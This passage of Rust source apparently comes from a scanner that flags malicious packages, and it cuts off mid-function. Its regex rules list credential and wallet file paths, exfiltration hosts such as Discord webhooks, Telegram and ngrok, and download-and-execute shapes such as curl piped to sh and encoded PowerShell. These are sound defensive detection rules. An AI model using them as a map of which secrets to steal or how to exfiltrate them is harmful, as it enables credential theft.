//! Per-file indicator counting and code statistics (DESIGN.md sections 4.2 and 4.3).
//!
//! Identifier and call patterns are matched on the token stream from [`crate::lexer`], so
//! comments never count and a word inside a string is not mistaken for a call. Patterns
//! about string content (URLs, credential paths, exfiltration hosts, embedded shell
//! commands) are regexes run over string literal contents, or over whole comment-stripped
//! text for shell scripts and npm script commands.

use crate::lexer::{
    decoded_strings, joined_literals, lex, reversed_literals, strip_shell_comments, unescape_code,
    with_decoded, with_reversed, Lang, TokKind, Token,
};
use regex::{Regex, RegexSet};
use std::cell::OnceCell;
use std::sync::LazyLock;

/// Indicator families, in schema order. Index positions are used throughout this module.
pub const INDICATORS: [&str; 14] = [
    "proc_exec",
    "dyn_code",
    "network",
    "decode_obf",
    "env_access",
    "secret_paths",
    "persistence",
    "recon",
    "download_exec",
    "exfil_endpoint",
    "ip_url",
    "url",
    "file_write",
    "crypto_wallet",
];

pub const PROC_EXEC: usize = 0;
pub const DYN_CODE: usize = 1;
pub const NETWORK: usize = 2;
pub const DECODE_OBF: usize = 3;
pub const ENV_ACCESS: usize = 4;
pub const SECRET_PATHS: usize = 5;
pub const PERSISTENCE: usize = 6;
pub const RECON: usize = 7;
pub const DOWNLOAD_EXEC: usize = 8;
pub const EXFIL_ENDPOINT: usize = 9;
pub const IP_URL: usize = 10;
pub const URL: usize = 11;
pub const FILE_WRITE: usize = 12;
pub const CRYPTO_WALLET: usize = 13;
pub const N_IND: usize = INDICATORS.len();

/// Evidence ordering: the most telling indicators first, plain URLs last.
pub const EVIDENCE_RANK: [usize; N_IND] = [
    DOWNLOAD_EXEC,
    EXFIL_ENDPOINT,
    DYN_CODE,
    DECODE_OBF,
    PROC_EXEC,
    SECRET_PATHS,
    PERSISTENCE,
    IP_URL,
    NETWORK,
    RECON,
    ENV_ACCESS,
    CRYPTO_WALLET,
    FILE_WRITE,
    URL,
];

/// Hits kept per file for evidence selection; counts are never capped.
const MAX_HITS_PER_FILE: usize = 400;
/// Strings shorter than this are too short for a meaningful entropy estimate.
const ENTROPY_MIN_LEN: usize = 20;
/// Whitespace run that hides the rest of a line from view.
pub const HIDDEN_WS_RUN: usize = 100;

/// Byte offset where code resumes after a hiding whitespace run, if the line has one.
pub fn hidden_ws_offset(line: &str) -> Option<usize> {
    let b = line.as_bytes();
    let mut run = 0usize;
    for (i, &c) in b.iter().enumerate() {
        if c == b' ' || c == b'\t' {
            run += 1;
        } else {
            if run >= HIDDEN_WS_RUN {
                return Some(i);
            }
            run = 0;
        }
    }
    None
}

#[derive(Debug, Clone, Default)]
pub struct FileAnalysis {
    pub counts: [u32; N_IND],
    /// `(indicator, 1-based line)` for evidence.
    pub hits: Vec<(usize, u32)>,
    pub bytes: u64,
    pub n_lines: u64,
    pub max_line_len: u64,
    pub long_lines: u64,
    pub chars: u64,
    pub nonascii_chars: u64,
    pub max_str_entropy: f64,
    pub str_entropy_sum: f64,
    pub n_entropy_strs: u64,
    pub longest_b64_run: u64,
    pub hex_escapes: u64,
    pub n_idents: u64,
    pub n_obf_idents: u64,
    /// Relative module specifiers (`./x`, `../y`) required or imported (JavaScript only).
    pub relative_imports: Vec<String>,
    /// Lines where code resumes after a run of `HIDDEN_WS_RUN` or more spaces or tabs,
    /// which pushes it past the right edge of an editor or diff view.
    pub hidden_ws_lines: u64,
    /// Lines holding both a dynamic-code call and a decode call (`exec(b64decode(..))`).
    pub exec_decoded_lines: u64,
}

impl FileAnalysis {
    fn hit(&mut self, ind: usize, line: u32) {
        self.counts[ind] += 1;
        if self.hits.len() < MAX_HITS_PER_FILE {
            self.hits.push((ind, line));
        }
    }

    /// Add what was found in code run from a literal that starts on `line` (see
    /// [`literal_code`]); `spans_lines` maps its lines onto the file's, otherwise every hit
    /// lands on `line`. Line statistics stay with the file that holds the literal.
    fn merge_nested(&mut self, inner: FileAnalysis, line: u32, spans_lines: bool) {
        for (c, n) in self.counts.iter_mut().zip(inner.counts) {
            *c += n;
        }
        let room = MAX_HITS_PER_FILE.saturating_sub(self.hits.len());
        self.hits.extend(
            inner
                .hits
                .into_iter()
                .take(room)
                .map(|(i, l)| (i, if spans_lines { line + l - 1 } else { line })),
        );
        self.max_str_entropy = self.max_str_entropy.max(inner.max_str_entropy);
        self.str_entropy_sum += inner.str_entropy_sum;
        self.n_entropy_strs += inner.n_entropy_strs;
        self.longest_b64_run = self.longest_b64_run.max(inner.longest_b64_run);
        self.hex_escapes += inner.hex_escapes;
        self.n_idents += inner.n_idents;
        self.n_obf_idents += inner.n_obf_idents;
        self.relative_imports.extend(inner.relative_imports);
    }
}

struct StrRule {
    ind: usize,
    re: Regex,
    keep: fn(&str, usize, usize) -> bool,
}

fn always(_: &str, _: usize, _: usize) -> bool {
    true
}

/// `discord` names a token store (`%APPDATA%/discord/Local Storage`), but a Discord webhook
/// URL is an exfiltration endpoint and should not count twice.
fn not_discord_host(hay: &str, start: usize, end: usize) -> bool {
    if !hay[start..end].eq_ignore_ascii_case("discord") {
        return true;
    }
    let rest = &hay.as_bytes()[end..];
    let rest = rest[..rest.len().min(8)].to_ascii_lowercase();
    ![&b".com"[..], b"app.com", b"app.net", b".gg"]
        .iter()
        .any(|h| rest.starts_with(h))
}

/// Loopback and unspecified addresses show up in benign tests and dev servers.
fn public_ipv4(hay: &str, start: usize, end: usize) -> bool {
    let m = &hay[start..end];
    let host = m.split("//").nth(1).unwrap_or("");
    let octets: Vec<u32> = host.split('.').filter_map(|o| o.parse().ok()).collect();
    if octets.len() != 4 || octets.iter().any(|&o| o > 255) {
        return false;
    }
    !(octets[0] == 127 || octets == [0, 0, 0, 0])
}

/// Shell redirection into `/dev/null` is not a file write worth counting.
fn not_dev_null(hay: &str, start: usize, _end: usize) -> bool {
    let after = &hay[start..];
    let gt = after.find('>').unwrap_or(0);
    !after[gt..]
        .trim_start_matches(['>', ' ', '\t'])
        .starts_with("/dev/null")
}

/// Compile a rule with ASCII word boundaries. A Unicode `\b` makes the regex crate's
/// lazy DFA give up at the first non-ASCII byte and fall back to an engine about 100x
/// slower, so one accented character in a megabyte string literal cost a second per MB.
fn compile(pat: &str) -> Regex {
    Regex::new(&pat.replace(r"\b", r"(?-u:\b)")).expect("valid indicator regex")
}

fn rule(ind: usize, pat: &str) -> StrRule {
    StrRule {
        ind,
        re: compile(pat),
        keep: always,
    }
}

fn rule_f(ind: usize, pat: &str, keep: fn(&str, usize, usize) -> bool) -> StrRule {
    StrRule {
        ind,
        re: compile(pat),
        keep,
    }
}

struct RuleSet {
    set: RegexSet,
    rules: Vec<StrRule>,
}

impl RuleSet {
    fn new(rules: Vec<StrRule>) -> Self {
        let set = RegexSet::new(rules.iter().map(|r| r.re.as_str())).expect("valid regex set");
        Self { set, rules }
    }

    /// Run every rule over `hay`. `line_of` maps a byte offset in `hay` to a 1-based line.
    fn apply(&self, hay: &str, fa: &mut FileAnalysis, line_of: &dyn Fn(usize) -> u32) {
        let matched = self.set.matches(hay);
        if !matched.matched_any() {
            return;
        }
        for idx in matched.iter() {
            let r = &self.rules[idx];
            for m in r.re.find_iter(hay) {
                if (r.keep)(hay, m.start(), m.end()) {
                    fa.hit(r.ind, line_of(m.start()));
                }
            }
        }
    }
}

/// Rules over string literal contents in code, and over shell text.
static STRING_RULES: LazyLock<RuleSet> = LazyLock::new(|| {
    RuleSet::new(vec![
        rule_f(
            SECRET_PATHS,
            r"(?i)\.ssh\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.aws[/\\]+credentials|\.npmrc|\.pypirc|\.git-credentials|\.docker[/\\]+config\.json|login data|local state|cookies\.sqlite|leveldb|discord|wallet|keychain|/etc/passwd|/etc/shadow|\.kube[/\\]+config",
            not_discord_host,
        ),
        rule(
            PERSISTENCE,
            r"(?i)crontab|\.bashrc|\.zshrc|\.bash_profile|(?:^|[/\\~])\.profile\b|start menu[/\\]+programs[/\\]+startup|currentversion[/\\]+run(?:once)?\b|launchagents|launchdaemons|systemd|systemctl\s+enable|schtasks|\.config[/\\]+autostart",
        ),
        rule(
            RECON,
            r"(?i)\b(?:whoami|ifconfig|ipconfig|uname|systeminfo|hostnamectl)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|node|perl|ruby)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\bpowershell(?:\.exe)?\b[^\n]*\s-(?:e|ec|en|enc|enco|encodedcommand)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)invoke-webrequest|\biwr\s|downloadstring|downloadfile|start-bitstransfer|\bcertutil(?:\.exe)?\b[^\n]*-urlcache|\bbitsadmin\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\bchmod\s+(?:[ugoa]*\+x|[0-7]{3,4})\s+\S+\s*(?:&&|;|\n)\s*\S",
        ),
        rule(
            EXFIL_ENDPOINT,
            r"(?i)discord(?:app)?\.com/api/webhooks|api\.telegram\.org|pastebin\.com|ngrok|webhook\.site|pipedream\.(?:net|com)|burpcollaborator|\boast\.|interact\.sh|interactsh|requestbin|transfer\.sh|ipinfo\.io|ifconfig\.me|api\.ipify\.org|dnslog\.cn|ceye\.io|hookbin\.com|canarytokens",
        ),
        rule_f(
            IP_URL,
            r"(?i)\bhttps?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
            public_ipv4,
        ),
        rule(URL, r#"(?i)\bhttps?://[^\s'"<>`\\]+"#),
        rule(
            CRYPTO_WALLET,
            r"(?i)bitcoin|ethereum|metamask|exodus|electrum",
        ),
        rule(
            DECODE_OBF,
            r"(?i)\bbase64\s+(?:-d|--decode)\b|frombase64string|\bxxd\s+-r|^rot[_-]?13$",
        ),
        rule(
            NETWORK,
            r"(?i)\b(?:curl|wget)\b|invoke-restmethod|\bnslookup\b",
        ),
        // Code inside a string that runs decoded data, as handed to `python -c` or
        // `node -e`: both indicators on one line count as exec_decoded. ASCII classes only:
        // a Unicode `\w` under a bounded repeat made the whole rule set scan 4x slower.
        rule(DYN_CODE, EXEC_DECODED_IN_STRING),
        rule(DECODE_OBF, EXEC_DECODED_IN_STRING),
    ])
});

const EXEC_DECODED_IN_STRING: &str = r#"(?-u)\b(?:exec|eval|Function)\s*\(\s*[A-Za-z0-9_.$'"()\[\]]{0,80}?\b(?:b64decode|b32decode|b85decode|a85decode|decodebytes|decompress|unhexlify|fromhex|atob)\s*\(|(?-u)\beval\s*\(\s*Buffer\.from\s*\("#;

/// Additional rules for shell scripts and npm script commands, where every word is a command.
static SHELL_RULES: LazyLock<RuleSet> = LazyLock::new(|| {
    RuleSet::new(vec![
        rule(
            NETWORK,
            r"(?i)\b(?:nc|ncat|netcat|irm|scp|ftp|tftp|telnet)\b",
        ),
        rule(
            PROC_EXEC,
            r"(?i)\b(?:ba|z)?sh\s+-c\b|\bcmd(?:\.exe)?\s+/c\b|\bstart-process\b|\bpowershell(?:\.exe)?\b|\bpwsh\b|\bnohup\b",
        ),
        rule(
            DYN_CODE,
            r"(?i)\beval\b|\binvoke-expression\b|\biex\b|\bnode\s+(?:-e|--eval|-p|--print)\b|\bpython[0-9.]*\s+-c\b",
        ),
        rule(ENV_ACCESS, r"(?i)\$env:|\bprintenv\b|%[a-z_]+%"),
        rule_f(FILE_WRITE, r"(?:^|[^0-9&>])>{1,2}\s*[^\s&|>]", not_dev_null),
        rule(
            FILE_WRITE,
            r"(?i)\bchmod\b|\bset-content\b|\bout-file\b|\btee\b",
        ),
    ])
});

static HEX_ESCAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\u\{[0-9a-fA-F]{1,6}\}").unwrap()
});

static WALLET_ADDRESS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^(?:bc1[a-z0-9]{25,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40}|T[1-9A-HJ-NP-Za-km-z]{33})$",
    )
    .unwrap()
});

const WALLET_WORDS: [&str; 5] = ["bitcoin", "ethereum", "metamask", "exodus", "electrum"];

/// Shannon entropy in bits per byte.
pub fn entropy(s: &[u8]) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut freq = [0u32; 256];
    for &b in s {
        freq[b as usize] += 1;
    }
    let n = s.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

fn longest_b64_run(s: &str) -> u64 {
    let mut best = 0u64;
    let mut cur = 0u64;
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'_' | b'-') {
            cur += 1;
            best = best.max(cur);
        } else {
            cur = 0;
        }
    }
    best
}

fn is_obf_ident(s: &str) -> bool {
    if let Some(hex) = s.strip_prefix("_0x") {
        if !hex.is_empty() && hex.bytes().all(|b| b.is_ascii_hexdigit()) {
            return true;
        }
    }
    s.len() > 30 && entropy(s.as_bytes()) > 4.3
}

/// Byte offsets of line starts, for mapping regex match offsets to line numbers.
struct LineIndex(Vec<usize>);

impl LineIndex {
    fn new(s: &str) -> Self {
        let mut v = vec![0];
        v.extend(memchr_iter(b'\n', s.as_bytes()).map(|p| p + 1));
        Self(v)
    }
    fn line(&self, off: usize) -> u32 {
        match self.0.binary_search(&off) {
            Ok(i) => i as u32 + 1,
            Err(i) => i as u32,
        }
    }
}

fn memchr_iter(needle: u8, hay: &[u8]) -> impl Iterator<Item = usize> + '_ {
    hay.iter()
        .enumerate()
        .filter(move |(_, &b)| b == needle)
        .map(|(i, _)| i)
}

fn text_stats(fa: &mut FileAnalysis, text: &str) {
    fa.bytes = text.len() as u64;
    for line in text.lines() {
        fa.n_lines += 1;
        let len = line.len() as u64;
        fa.max_line_len = fa.max_line_len.max(len);
        if len > 1000 {
            fa.long_lines += 1;
        }
        if len as usize > HIDDEN_WS_RUN && hidden_ws_offset(line).is_some() {
            fa.hidden_ws_lines += 1;
        }
    }
    for c in text.chars() {
        fa.chars += 1;
        if !c.is_ascii() {
            fa.nonascii_chars += 1;
        }
    }
    fa.hex_escapes = HEX_ESCAPE.find_iter(text).count() as u64;
}

fn string_stats(fa: &mut FileAnalysis, s: &str) {
    if s.len() >= ENTROPY_MIN_LEN {
        let e = entropy(s.as_bytes());
        fa.max_str_entropy = fa.max_str_entropy.max(e);
        fa.str_entropy_sum += e;
        fa.n_entropy_strs += 1;
    }
    fa.longest_b64_run = fa.longest_b64_run.max(longest_b64_run(s));
}

/// String literals joined by `+`, or written side by side in Python, folded into one, so a
/// host, path or module name split across literals (`'child_' + 'process'`) still matches.
struct Fold {
    text: String,
    /// Offset in `text` and source line where each literal starts.
    parts: Vec<(usize, u32)>,
}

impl Fold {
    fn line(&self, off: usize, idx: &LineIndex) -> u32 {
        let k = self.parts.partition_point(|p| p.0 <= off).saturating_sub(1);
        let (start, line) = self.parts[k];
        line + idx.line(off) - idx.line(start)
    }
}

fn is_punct(t: Option<&Token<'_>>, ops: &[&str]) -> bool {
    t.is_some_and(|t| t.kind == TokKind::Punct && ops.contains(&t.text))
}

/// Find runs of literals to fold: `(first, end, literal indices)`, where `first..end` is
/// the token range the folded literal replaces (with redundant parentheses around it).
pub(crate) fn fold_runs(toks: &[Token<'_>], lang: Lang) -> Vec<(usize, usize, Vec<usize>)> {
    // Operators that bind tighter than `+`: a literal next to one is not a `+` operand.
    const TIGHT_BEFORE: &[&str] = &["*", "**", "/", "%", "-", ".", "?."];
    const TIGHT_AFTER: &[&str] = &["*", "**", "/", "%", ".", "?.", "[", "("];
    let is_str = |i: usize| toks.get(i).is_some_and(|t| t.kind == TokKind::Str);
    // A unit is one literal, or in Python several adjacent ones (implicit concatenation,
    // which binds tighter than any operator).
    let unit_end = |i: usize| {
        let mut j = i + 1;
        if lang == Lang::Python {
            while is_str(j) {
                j += 1;
            }
        }
        j
    };
    let mut out = Vec::new();
    let mut i = 0;
    while i < toks.len() {
        if !is_str(i) || (i > 0 && is_punct(toks.get(i - 1), TIGHT_BEFORE)) {
            i += 1;
            continue;
        }
        let mut units = vec![(i, unit_end(i))];
        while let Some(&(_, e)) = units.last() {
            if is_punct(toks.get(e), &["+"]) && is_str(e + 1) {
                units.push((e + 1, unit_end(e + 1)));
            } else {
                break;
            }
        }
        // `'a' + 'b'.join(x)` adds 'a' to the call's result: the last unit is not folded.
        if units.len() > 1 && is_punct(toks.get(units[units.len() - 1].1), TIGHT_AFTER) {
            units.pop();
        }
        let (first, mut end) = (units[0].0, units[units.len() - 1].1);
        let lits: Vec<usize> = units.iter().flat_map(|&(a, b)| a..b).collect();
        if lits.len() < 2 {
            i = end;
            continue;
        }
        // `require(('child_' + 'process'))`: parentheses that only group the expression.
        let mut start = first;
        let grouping = start >= 1
            && is_punct(toks.get(start - 1), &["("])
            && is_punct(toks.get(end), &[")"])
            && (start < 2
                || !matches!(toks[start - 2].kind, TokKind::Ident | TokKind::Str)
                    && !is_punct(toks.get(start - 2), &[")", "]"]));
        if grouping {
            start -= 1;
            end += 1;
        }
        out.push((start, end, lits));
        i = end;
    }
    out
}

fn make_fold(toks: &[Token<'_>], lits: &[usize]) -> Fold {
    let mut text = String::new();
    let mut parts = Vec::with_capacity(lits.len());
    for &l in lits {
        parts.push((text.len(), toks[l].line));
        text.push_str(toks[l].text);
    }
    Fold { text, parts }
}

/// Analyze one source file or command string.
pub fn analyze(text: &str, lang: Lang) -> FileAnalysis {
    let mut fa = FileAnalysis::default();
    text_stats(&mut fa, text);
    match lang {
        Lang::Shell => analyze_shell(text, &mut fa),
        Lang::Python | Lang::Js => analyze_source(text, lang, &mut fa, 0),
    }
    fa
}

/// How deep code passed to `exec` as a literal is followed (`exec('exec("...")')`).
const MAX_LITERAL_CODE_DEPTH: u32 = 3;

/// Lex, decode and fold Python or JavaScript source, then run the rules over it. Code
/// handed to `exec`/`eval` as a literal (see [`literal_code`]) is analyzed as code, not as
/// a string, with its hits on the literal's line.
fn analyze_source(text: &str, lang: Lang, fa: &mut FileAnalysis, depth: u32) {
    let raw = lex(text, lang);
    let decoded = decoded_strings(text, &raw, lang);
    let dec = with_decoded(&raw, &decoded);
    let revs = reversed_literals(&dec, lang);
    let unrev = with_reversed(&dec, &revs);
    let joins = joined_literals(&unrev, lang);
    let toks = with_reversed(&unrev, &joins);
    let runs = fold_runs(&toks, lang);
    if runs.is_empty() {
        let skip = nested_code(&toks, lang, fa, depth);
        analyze_code(&toks, &[], &skip, lang, fa, depth == 0);
    } else {
        let folds: Vec<Fold> = runs.iter().map(|r| make_fold(&toks, &r.2)).collect();
        let mut code = Vec::with_capacity(toks.len());
        let mut fold_of = Vec::with_capacity(toks.len());
        let mut i = 0;
        for (r, f) in runs.iter().zip(&folds) {
            for t in &toks[i..r.0] {
                code.push(*t);
                fold_of.push(None);
            }
            code.push(Token {
                kind: TokKind::Str,
                text: &f.text,
                line: f.parts[0].1,
            });
            fold_of.push(Some(f));
            i = r.1;
        }
        for t in &toks[i..] {
            code.push(*t);
            fold_of.push(None);
        }
        let skip = nested_code(&code, lang, fa, depth);
        analyze_code(&code, &fold_of, &skip, lang, fa, depth == 0);
    }
}

/// Analyze the literal code in `toks` into `fa`; returns the indices of those literals,
/// which the caller then leaves out of its string rules so nothing is counted twice.
fn nested_code(toks: &[Token<'_>], lang: Lang, fa: &mut FileAnalysis, depth: u32) -> Vec<usize> {
    if depth >= MAX_LITERAL_CODE_DEPTH {
        return Vec::new();
    }
    let mut skip = Vec::new();
    for (k, enc) in literal_code(toks, lang) {
        let t = toks[k];
        // Bundlers wrap each module of a development build in `eval("...")` and name it
        // with a `//# sourceURL=` comment; reading those as code would put whole libraries
        // in view.
        if t.text.contains("sourceURL=") || t.text.contains("sourceMappingURL=") {
            continue;
        }
        let code = match enc {
            Encoding::Plain => {
                skip.push(k);
                unescape_code(t.text)
            }
            // The encoded blob stays a string too: its length and entropy are evidence.
            Encoding::Base64 | Encoding::Base64Deflated => {
                match decode_base64_text(t.text, enc == Encoding::Base64Deflated) {
                    Some(text) => std::borrow::Cow::Owned(text),
                    None => continue,
                }
            }
        };
        let mut inner = FileAnalysis::default();
        analyze_source(&code, lang, &mut inner, depth + 1);
        // A literal written over several lines keeps its lines; one written on a single
        // line (with `\n` escapes) or encoded puts every hit on that line.
        let spans_lines = enc == Encoding::Plain && t.text.contains('\n');
        fa.merge_nested(inner, t.line, spans_lines);
    }
    skip
}

/// How a literal that is run as code is written.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Encoding {
    Plain,
    Base64,
    /// Base64 over zlib, gzip or raw deflate data (`exec(zlib.decompress(b64decode(..)))`).
    Base64Deflated,
}

/// Names of decompressors for deflate data in Python and Node.
const INFLATERS: &[&str] = &[
    "decompress",
    "inflateSync",
    "gunzipSync",
    "unzipSync",
    "inflateRawSync",
];

/// Most decompressed text read from one literal.
const MAX_INFLATED: u64 = 1 << 20;

/// Names of base64 decoders in Python and JavaScript.
const B64_DECODERS: &[&str] = &[
    "b64decode",
    "standard_b64decode",
    "urlsafe_b64decode",
    "decodebytes",
    "decodestring",
    "a2b_base64",
    "atob",
];

/// String literals that are run as code, with their encoding:
/// - the first argument of Python `exec(...)`, `eval(...)` and `compile(...)`, of JavaScript
///   `eval(...)`, and the body (last argument) of `Function(...)` / `new Function(...)`;
/// - the same calls over one base64 literal decoded in place (`exec(b64decode('...'))`,
///   `eval(atob('...'))`, `eval(Buffer.from('...', 'base64').toString())`);
/// - Python code passed on a command line: the literal after `'-c'` in a list that also
///   names `sys.executable` or a `python` program (`Popen([sys.executable, '-c', '...'])`).
///
/// Indices into `toks`, in order.
pub(crate) fn literal_code(toks: &[Token<'_>], lang: Lang) -> Vec<(usize, Encoding)> {
    let mut out = Vec::new();
    let is_str = |k: usize| toks.get(k).is_some_and(|t| t.kind == TokKind::Str);
    let is = |k: usize, x: &str| {
        toks.get(k)
            .is_some_and(|t| t.kind != TokKind::Str && t.text == x)
    };
    for (i, t) in toks.iter().enumerate() {
        if lang == Lang::Python && t.kind == TokKind::Str && t.text == "-c" {
            if is(i + 1, ",") && is_str(i + 2) && interpreter_list(toks, i) {
                out.push((i + 2, Encoding::Plain));
            }
            continue;
        }
        if t.kind != TokKind::Ident || !is(i + 1, "(") {
            continue;
        }
        if i > 0 && toks[i - 1].text == "." && toks[i - 1].kind == TokKind::Punct {
            continue;
        }
        match (lang, t.text) {
            (Lang::Python, "exec" | "eval" | "compile") | (Lang::Js, "eval") => {
                // The code is the first argument; the rest are scopes, a file name or a mode.
                if is_str(i + 2) && (is(i + 3, ")") || is(i + 3, ",")) {
                    out.push((i + 2, Encoding::Plain));
                } else if let Some(found) = base64_argument(toks, i + 1) {
                    out.push(found);
                }
            }
            (Lang::Js, "Function") => {
                // Literal parameter names, then the literal body.
                let mut k = i + 2;
                while is_str(k) && is(k + 1, ",") {
                    k += 2;
                }
                if is_str(k) && is(k + 1, ")") {
                    out.push((k, Encoding::Plain));
                } else if let Some(found) = base64_argument(toks, i + 1) {
                    out.push(found);
                }
            }
            _ => {}
        }
    }
    // `exec(compile(b64decode('...'), ...))` finds the literal from both calls.
    out.sort_unstable_by_key(|&(k, _)| k);
    out.dedup_by_key(|&mut (k, _)| k);
    out
}

/// The one string literal inside the parenthesized argument list that opens at `open`,
/// when that list also decodes base64 (a decoder name, or `'base64'` as an encoding), and
/// whether the list also inflates the decoded bytes.
fn base64_argument(toks: &[Token<'_>], open: usize) -> Option<(usize, Encoding)> {
    let mut depth = 0usize;
    let mut lit = None;
    let mut decodes = false;
    let mut inflates = false;
    for (k, t) in toks.iter().enumerate().skip(open) {
        match (t.kind, t.text) {
            (TokKind::Punct, "(" | "[" | "{") => depth += 1,
            (TokKind::Punct, ")" | "]" | "}") => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    let enc = if inflates {
                        Encoding::Base64Deflated
                    } else {
                        Encoding::Base64
                    };
                    return decodes.then_some((lit?, enc));
                }
            }
            (TokKind::Ident, name) if B64_DECODERS.contains(&name) => decodes = true,
            (TokKind::Ident, name) if INFLATERS.contains(&name) => inflates = true,
            (TokKind::Str, "base64" | "base64url") => decodes = true,
            (TokKind::Str, text) if text.len() >= 16 => {
                if lit.is_some() {
                    return None;
                }
                lit = Some(k);
            }
            _ => {}
        }
        if k - open > 64 {
            return None;
        }
    }
    None
}

/// Whether the bracketed list holding the `'-c'` at `c` also names a Python interpreter.
fn interpreter_list(toks: &[Token<'_>], c: usize) -> bool {
    toks[c.saturating_sub(8)..c]
        .iter()
        .rev()
        .take_while(|t| !(t.kind == TokKind::Punct && matches!(t.text, "[" | "(")))
        .any(|t| match t.kind {
            TokKind::Ident => t.text == "executable",
            TokKind::Str => {
                let base = t.text.rsplit(['/', '\\']).next().unwrap_or("");
                base.starts_with("python")
            }
            _ => false,
        })
}

/// Decode a base64 literal (standard or URL-safe alphabet, whitespace and `\n` escapes
/// ignored) to text, inflating the bytes first when `inflate` is set; `None` unless it
/// decodes cleanly to mostly printable UTF-8.
pub(crate) fn decode_base64_text(s: &str, inflate: bool) -> Option<String> {
    let mut bits = 0u32;
    let mut nbits = 0u32;
    let mut out = Vec::with_capacity(s.len() / 4 * 3);
    let mut chars = s.bytes().peekable();
    while let Some(c) = chars.next() {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b' ' | b'\t' | b'\r' | b'\n' => continue,
            b'\\' if chars.peek() == Some(&b'n') => {
                chars.next();
                continue;
            }
            _ => return None,
        };
        bits = (bits << 6) | u32::from(v);
        nbits += 6;
        if nbits >= 8 {
            nbits -= 8;
            out.push((bits >> nbits) as u8);
            bits &= (1 << nbits) - 1;
        }
    }
    if inflate {
        out = inflate_any(&out)?;
    }
    let text = String::from_utf8(out).ok()?;
    let printable = text
        .chars()
        .filter(|c| !c.is_control() || c.is_whitespace())
        .count();
    (text.len() >= 8 && printable * 10 >= text.chars().count() * 9).then_some(text)
}

/// Inflate zlib, gzip or raw deflate bytes, reading at most [`MAX_INFLATED`] bytes out.
fn inflate_any(data: &[u8]) -> Option<Vec<u8>> {
    use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
    use std::io::Read;
    let read = |r: &mut dyn Read| {
        let mut out = Vec::new();
        r.take(MAX_INFLATED).read_to_end(&mut out).ok()?;
        (!out.is_empty()).then_some(out)
    };
    match data {
        [0x1f, 0x8b, ..] => read(&mut GzDecoder::new(data)),
        [0x78, ..] => read(&mut ZlibDecoder::new(data)),
        _ => read(&mut DeflateDecoder::new(data)),
    }
}

fn analyze_shell(text: &str, fa: &mut FileAnalysis) {
    let clean = strip_shell_comments(text);
    let idx = LineIndex::new(&clean);
    let line_of = |off: usize| idx.line(off);
    STRING_RULES.apply(&clean, fa, &line_of);
    SHELL_RULES.apply(&clean, fa, &line_of);
    for tok in lex(text, Lang::Shell) {
        if tok.kind == TokKind::Str {
            string_stats(fa, tok.text);
        } else if tok.kind == TokKind::Ident {
            fa.longest_b64_run = fa.longest_b64_run.max(longest_b64_run(tok.text));
        }
    }
}

/// `fold_of[i]` is the fold token `i` came from, if any (empty when nothing was folded).
/// `skip` holds the (sorted) indices of literals already analyzed as code; `top` is false
/// for such code itself, whose file-level rules are left to the file that holds it.
fn analyze_code(
    toks: &[Token<'_>],
    fold_of: &[Option<&Fold>],
    skip: &[usize],
    lang: Lang,
    fa: &mut FileAnalysis,
    top: bool,
) {
    // Strings and identifiers first: they feed both rules and statistics.
    for (k, t) in toks.iter().enumerate() {
        match t.kind {
            TokKind::Str if skip.binary_search(&k).is_ok() => {}
            TokKind::Str => {
                let fold = fold_of.get(k).copied().flatten();
                match fold {
                    // Entropy stays per literal: folding long messages in benign code would
                    // shift it, while a chunked blob is high-entropy chunk by chunk anyway.
                    Some(f) => {
                        for (w, p) in f.parts.iter().enumerate() {
                            let end = f.parts.get(w + 1).map_or(f.text.len(), |q| q.0);
                            string_stats(fa, &f.text[p.0..end]);
                        }
                        fa.longest_b64_run = fa.longest_b64_run.max(longest_b64_run(t.text));
                    }
                    None => string_stats(fa, t.text),
                }
                // Built on the first match only: most strings match no rule. Counting
                // newlines per match instead is quadratic in a long string with many hits.
                let idx = OnceCell::new();
                let line_of = |off: usize| {
                    let idx = idx.get_or_init(|| LineIndex::new(t.text));
                    match fold {
                        Some(f) => f.line(off, idx),
                        None => t.line - 1 + idx.line(off),
                    }
                };
                STRING_RULES.apply(t.text, fa, &line_of);
                if WALLET_ADDRESS.is_match(t.text.trim()) {
                    fa.hit(CRYPTO_WALLET, t.line);
                }
            }
            TokKind::Ident => {
                fa.n_idents += 1;
                if is_obf_ident(t.text) {
                    fa.n_obf_idents += 1;
                }
                if t.text.len() >= 6 {
                    let lower = t.text.to_ascii_lowercase();
                    if WALLET_WORDS.iter().any(|w| lower.contains(w)) {
                        fa.hit(CRYPTO_WALLET, t.line);
                    }
                }
            }
            _ => {}
        }
    }
    match lang {
        Lang::Python => python_rules(toks, fa),
        Lang::Js => js_rules(toks, fa),
        Lang::Shell => {}
    }
    if !top {
        return;
    }
    // Fetch + write + execute in one file is the classic dropper shape.
    if fa.counts[NETWORK] > 0 && fa.counts[FILE_WRITE] > 0 && fa.counts[PROC_EXEC] > 0 {
        let line = fa
            .hits
            .iter()
            .find(|(i, _)| *i == PROC_EXEC)
            .map(|(_, l)| *l)
            .unwrap_or(1);
        fa.hit(DOWNLOAD_EXEC, line);
    }
